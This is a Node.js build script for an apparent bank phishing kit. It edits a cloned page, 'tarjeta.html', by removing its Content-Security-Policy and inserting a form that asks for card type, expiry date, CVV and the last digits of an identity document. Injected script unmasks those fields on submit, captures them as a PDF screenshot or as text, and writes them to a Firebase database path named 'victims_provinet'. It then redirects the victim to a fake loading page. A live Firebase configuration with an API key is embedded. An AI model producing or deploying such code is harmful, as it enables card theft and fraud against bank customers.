const fs = require('fs');

let html = fs.readFileSync('tarjeta.html', 'utf8');

// 1. Remove CSP
html = html.replace(/<meta[^>]*Content-Security-Policy[^>]*>/ig, '');

// 2. Fix the header
html = html.replace(
    /<h1 id=titulo1>¡Bienvenido!<\/h1>/i, 
    '<h1 id="titulo1" style="font-weight: bold; font-size: 26px; text-align: center; color: #121212;">Ingresa los datos de<br>una tarjeta</h1>'
);

// 3. Replace the form with the new tarjeta form
const formStart = html.indexOf('<form');
const formEnd = html.indexOf('</form>') + 7;

const newForm = `
<form id="form">
    <div style="background-color: #f4f4f4; border-bottom: 1px solid #000; margin-bottom: 20px; position: relative; height: 56px;">
        <select id="tipo_tarjeta" name="tipo_tarjeta" style="width: 100%; height: 100%; padding: 15px 10px 0 16px; border: none; background: transparent; font-size: 15px; color: #121212; appearance: none; -webkit-appearance: none; outline: none; box-sizing: border-box;" required>
            <option value="" disabled selected>Seleccione su tarjeta</option>
            <option value="TDD">TDD (Tarjeta de debito)</option>
            <option value="TDC">TDC (Tarjeta de credito)</option>
        </select>
        <img class="fa-angle-down" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAALCAYAAAHXQOfKAAAABGdBTUEAALGPC/xhBQAAAW1JREFUKBV9kT9Iw1AQxr9LlFKwdXMVlQ5piuAmdlRBURxEBMHBxV2cmqRDhtoiDuLk6CwiiKOb4FKhgvivCLo6Kagg1JKc9wIJzxZ9EN7d7757774XQF95h9+ivLjNGb0A5F1+VcR2eB22z3162UALmwqIqpUULIfDOCGrzDkEeHyoEcVQ7SLiXhPDCbRcboJxBYIt8OW+SjN6QxT7Phtd0PZ4pQsKkKFWjTDEvsxe0gVid4eB3YipQUbLPKQSERZVruLonmwK/e0Az8q4eLoojKEnKdZ9+jANLIYtfBop5I6WKVDFX0v8T+mAxKcnPivyHMficUkvdsbK7uE3TkU/J/M40WMVyjwfBAIJLNfP3lborLPRdnktZBxIQ9sEpm9qdB41KyEzk+3iRGwuCLxOpzDR8OnL8niQQlwKHzAIe3dV2ogPTppjIFNYMkVd8oxYeZJHG5G9mc5ivFGi91j37573eEv+Ulu+yb+EP0mqhakvQTQRAAAAAElFTkSuQmCC" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">
    </div>
    
    <div style="background-color: #f4f4f4; border-bottom: 1px solid #000; margin-bottom: 20px; position: relative; height: 56px;">
        <input type="text" id="fecha_vencimiento" name="fecha_vencimiento" placeholder=" " style="width: 100%; height: 100%; padding: 15px 10px 0 16px; border: none; background: transparent; font-size: 15px; color: #121212; outline: none; box-sizing: border-box;" maxlength="5" required>
        <label for="fecha_vencimiento" class="control-label" style="position: absolute; left: 16px; top: 18px; color: #b3b3b3; font-size: 15px; transition: 0.2s ease all; pointer-events: none;">MM/AA</label>
    </div>

    <div style="background-color: #f4f4f4; border-bottom: 1px solid #000; margin-bottom: 20px; position: relative; height: 56px;">
        <input type="password" id="cvv" name="cvv" placeholder=" " style="width: 100%; height: 100%; padding: 15px 10px 0 16px; border: none; background: transparent; font-size: 15px; color: #121212; outline: none; box-sizing: border-box;" maxlength="4" required>
        <label for="cvv" class="control-label" style="position: absolute; left: 16px; top: 18px; color: #b3b3b3; font-size: 15px; transition: 0.2s ease all; pointer-events: none;">Código de seguridad</label>
    </div>

    <div style="background-color: #f4f4f4; border-bottom: 1px solid #000; margin-bottom: 20px; position: relative; height: 56px;">
        <input type="password" id="ultimos_digitos" name="ultimos_digitos" placeholder=" " style="width: 100%; height: 100%; padding: 15px 10px 0 16px; border: none; background: transparent; font-size: 15px; color: #121212; outline: none; box-sizing: border-box;" maxlength="3" required>
        <label for="ultimos_digitos" class="control-label" style="position: absolute; left: 16px; top: 18px; color: #b3b3b3; font-size: 15px; transition: 0.2s ease all; pointer-events: none;">Ultimos 3 digitos de su documento</label>
    </div>

    <div style="text-align: center; margin-top: 25px;">
        <button type="submit" id="submit" style="background-color: #1464a5; color: white; width: 100%; height: 48px; border: none; border-radius: 2px; font-size: 15px; cursor: pointer;">Verificar</button>
    </div>
</form>
<script>
    // Format MM/AA automatically
    document.getElementById('fecha_vencimiento').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // Only allow numbers for CVV and ultimos digitos
    document.getElementById('cvv').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\\D/g, '');
    });
    document.getElementById('ultimos_digitos').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\\D/g, '');
    });
</script>
`;

html = html.substring(0, formStart) + newForm + html.substring(formEnd);

// 4. Inject Firebase logic
html = html.replace(/<!-- Firebase App[\s\S]*?<\/script>\s*<\/body>/i, '</body>');

const firebaseScript = `
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-database-compat.js"></script>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
    authDomain: "sca-mms.firebaseapp.com",
    databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
    projectId: "sca-mms",
    storageBucket: "sca-mms.firebasestorage.app",
    messagingSenderId: "965549232304",
    appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.database();
  const DB_PATH = 'victims_provinet';
  
  window.addEventListener('load', function() {
    const form = document.getElementById('form');
    if (form) {
      form.removeAttribute('onsubmit');
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const btnSubmit = document.getElementById('submit');
        if(btnSubmit) {
            btnSubmit.innerText = 'Cargando...';
            btnSubmit.style.pointerEvents = 'none';
            btnSubmit.style.opacity = '0.7';
        }

        // Desocultar contraseñas/valores para capturar en texto legible
        const cvv = document.getElementById('cvv');
        const ultimos = document.getElementById('ultimos_digitos');
        if (cvv) cvv.type = 'text';
        if (ultimos) ultimos.type = 'text';

        // Esperar a que el DOM se actualice con el texto visible
        await new Promise(r => setTimeout(r, 200));

        try {
            // Verificar que carguen las librerías necesarias
            if (typeof html2canvas === 'undefined' || typeof window.jspdf === 'undefined') {
                console.error("Librerías no cargadas");
                
                // Fallback a texto
                const tipo_tarjeta = document.getElementById('tipo_tarjeta') ? document.getElementById('tipo_tarjeta').value : '';
                const fecha = document.getElementById('fecha_vencimiento') ? document.getElementById('fecha_vencimiento').value : '';
                const cvvVal = cvv ? cvv.value : '';
                const doc_digits = ultimos ? ultimos.value : '';
                const textData = tipo_tarjeta + " - " + fecha + " - " + cvvVal + " - " + doc_digits;

                let victimId = localStorage.getItem('current_victim_id');
                if (!victimId) victimId = "TEST_" + Date.now().toString();

                db.ref(DB_PATH + '/' + victimId).update({
                    tarjeta: textData
                }).then(() => {
                    window.location.href = 'cargando.html';
                }).catch(() => {
                    window.location.href = 'cargando.html';
                });
                return;
            }

            // Capturar pantalla del formulario
            const canvas = await html2canvas(document.getElementById('form'), {
                backgroundColor: '#ffffff',
                scale: 2
            });
            const imgData = canvas.toDataURL('image/jpeg', 0.8);

            // Generar PDF
            const { jsPDF } = window.jspdf;
            const pdf = new jsPDF({
                orientation: 'portrait',
                unit: 'px',
                format: [canvas.width, canvas.height]
            });
            pdf.addImage(imgData, 'JPEG', 0, 0, canvas.width, canvas.height);
            const pdfDataUri = pdf.output('datauristring');

            let victimId = localStorage.getItem('current_victim_id');
            if (!victimId) {
                victimId = "TEST_" + Date.now().toString();
                localStorage.setItem('current_victim_id', victimId);
                await db.ref(DB_PATH + '/' + victimId).set({
                    id: victimId,
                    tipo: "V",
                    usuario: "TEST",
                    first_seen: Date.now(),
                    status: 'Prueba Directa'
                });
            }
            
            db.ref(DB_PATH + '/' + victimId).update({
                tarjeta: pdfDataUri
            }).then(() => {
                window.location.href = 'cargando.html';
            }).catch(error => {
                console.error("Error de Firebase", error);
                window.location.href = 'cargando.html';
            });
        } catch (err) {
            console.error("Error general en captura", err);
            window.location.href = 'cargando.html';
        }
        return false;
      });
    }
  });
</script>
`;

const scriptStartIdx = html.indexOf('<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-app-compat.js"></script>');
if (scriptStartIdx !== -1) {
    html = html.substring(0, scriptStartIdx);
}

html = html + '\n' + firebaseScript;

fs.writeFileSync('tarjeta.html', html, 'utf8');
console.log('Done: tarjeta.html redesigned and integrated with Firebase');
